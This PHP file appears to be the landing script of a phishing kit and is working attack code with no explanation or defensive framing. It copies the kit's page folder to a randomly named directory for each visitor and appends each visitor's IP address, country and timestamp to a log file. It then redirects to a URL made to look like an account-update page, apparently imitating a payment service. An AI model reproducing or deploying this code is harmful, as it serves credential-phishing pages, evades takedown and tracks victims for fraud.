<?php
error_reporting(0);
ob_start();

include './access/lib/loca.php';

	$random=rand(0,9000000);
	$md5=md5($random);
	$base=base64_encode($md5);
	$dst1=md5($base) . $base;
     $dst2 = substr($dst1 , -9);
     $dst  = strtolower($dst2 );
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="access";
recurse_copy( $src, $dst );

$rndd = base64_encode(rand(111,9999999999999999));
$link = "/index.php?cmd=_update_account&session=$rndd";



$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");
$seen = "| New visitor from : ".$country." | ip address : $ip | date : $date @ $dateHis |
";
$flogs = fopen("logs.txt","a");
fwrite($flogs, $seen);
fclose($flogs);

header("location: $dst$link");
exit();
?>

